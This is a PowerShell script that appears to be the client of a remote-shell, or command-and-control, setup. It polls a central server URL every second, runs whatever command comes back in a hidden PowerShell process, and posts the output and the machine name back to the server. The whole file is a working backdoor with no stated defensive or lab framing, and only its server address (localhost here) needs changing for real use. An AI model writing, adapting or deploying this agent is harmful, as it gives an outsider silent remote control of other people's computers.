$centralServerUrl = "http://localhost/shell/"
Write-Output "Central server is now ready to execute commands...."
$desiredLocation = ""
while ($true) {
    try {
        $whoami = $env:COMPUTERNAME
            $getCommand = @{
                'computerName' = $whoami
                'type' = 'ping'
            }
            $commandJSON = $getCommand | ConvertTo-Json
           $command =  Invoke-RestMethod -Uri $centralServerUrl -Method Post -Body $commandJSON -ContentType "application/json"
        if ($command) {
            $modifiedString = $command -replace "&#amp;", '"'
            $modifiedString = $modifiedString -replace "&quot;", '"'
            if ($modifiedString.StartsWith("cd")) {
                try {
                    Invoke-Expression -Command $modifiedString
                    $currentLocation = Get-Location
                    $desiredLocation = $currentLocation.Path
                    $result = $desiredLocation
                } catch {
                    $result = "Failed to change location: $_"
                    $currentLocation = Get-Location
                    $desiredLocation = $currentLocation.Path
                }
            } else {
                
            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = "powershell.exe"

            # Set the location using Set-Location
            $processInfo.Arguments = "& {Set-Location -Path '$desiredLocation'; $modifiedString}"

            $processInfo.RedirectStandardOutput = $true
            $processInfo.UseShellExecute = $false
            $processInfo.CreateNoWindow = $true

            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $processInfo
            $process.Start() | Out-Null

            $result = $process.StandardOutput.ReadToEnd()
            $process.WaitForExit()
            }
            $formattedOutput = $result -replace "`r`n|`n|`r", '<br>'
            if (-not $formattedOutput.Trim()) {
                $formattedOutput = "No output received."
            }
            $resultData = @{
                'response' = $formattedOutput
                'computerName' = $whoami
                'executedCommand' = $command
                'type' = 'response'
            }
            $resultJson = $resultData | ConvertTo-Json
            Invoke-RestMethod -Uri $centralServerUrl -Method Post -Body $resultJson -ContentType "application/json"
        }
        Start-Sleep -Seconds 1
    }
    catch {
        $errorMessage = $_.Exception.Message
        Write-Output "Error: $errorMessage"
        $errorData = @{
            'response' = $errorMessage
            'type' = 'error'
            'computerName' = $whoami
        }
        $errorJson = $errorData | ConvertTo-Json
        try {
            Invoke-RestMethod -Uri $centralServerUrl -Method Post -Body $errorJson -ContentType "application/json"
        }
        catch {
            Write-Output "Failed to send error to the central server: $_"
        }
        Start-Sleep -Seconds 1
    }
}